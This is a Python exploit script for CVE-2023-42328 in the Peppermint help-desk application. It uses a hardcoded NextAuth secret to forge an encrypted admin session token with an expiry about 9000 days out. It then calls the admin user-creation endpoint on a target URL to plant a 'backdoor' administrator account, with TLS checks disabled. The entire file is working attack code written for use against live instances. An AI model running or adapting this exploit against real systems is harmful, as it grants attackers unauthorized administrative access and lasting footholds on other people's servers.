import json
import datetime
"""
sudo pip install pycryptodome requests --break-system-packages
sudo pip install git+https://github.com/cte/python-jose --break-system-packages

exploits CVE-2023-42328 and creates a admin user in peppermint instances.
if default admin is not present, you may need to change the `TOKEN` dict. The `/api/v1/users/all` endpoint lists available users.
"""

import requests
import argparse
from jose import jwe
from Crypto.Protocol.KDF import HKDF
from Crypto.Hash import SHA256

SECRET = "yudjXHbqE5VH4LkwZ4srgsdL2EZrjp"
PROXIES = {}

# DATA - you can get user data from `/api/v1/user/all` - all tested environments however had this user
TOKEN = {'name': 'admin', 'email': 'admin@admin.com', 'sub': '1',
         'user': {'email': 'admin@admin.com', 'id': 1, 'name': 'admin', 'isAdmin': True}, 'iat': 1696686714,
         'exp': 1699278714, 'jti': '96e96497-19e6-4a78-82b7-547b36fd67ac'}

parser = argparse.ArgumentParser()
parser.add_argument("target", help="e.g. http://localhost:5000")
parser.add_argument("-u", help="backdoor username", default="johndoe")
parser.add_argument("-p", help="backdoor password", default="backdoor")

args = parser.parse_args()


def get_key(secret):
    context = str.encode("NextAuth.js Generated Encryption Key")
    return HKDF(master=secret.encode(), key_len=32, salt=''.encode(), hashmod=SHA256, num_keys=1, context=context)


def reencrypt_token(token):
    future = datetime.datetime.now() + datetime.timedelta(days=9000)
    future = int(future.timestamp())
    token["exp"] = future
    key = get_key(SECRET)
    encrypted = jwe.encrypt(json.dumps(token), key, algorithm='dir')
    return encrypted.decode()


if __name__ == '__main__':
    new_token = reencrypt_token(TOKEN)
    url = f"{args.target}/api/v1/admin/user/create"
    data = {"password": args.p, "username": args.u, "name": args.u, "admin": True, "email":"johndoe@example.com"}
    cookies = {
      "next-auth.session-token": new_token,
      "next-auth.callback-url": args.target + "/admin/auth",
      "next-auth.csrf-token": "db81a40212e49b4a7caf15f99dd5d58d3284fe639300bc33ba963002b51323da%7C6a6708b38f4de4c9705f58c2545e67c20443f28640fb36c0d0d60660a9d2cfb7"

    }
    try:
        resp = requests.post(url,json=data, cookies=cookies, verify=False, proxies=PROXIES)
        if "User saved" in resp.json().get('message'):
            print("User created!")
    except Exception as e:
        print(e)
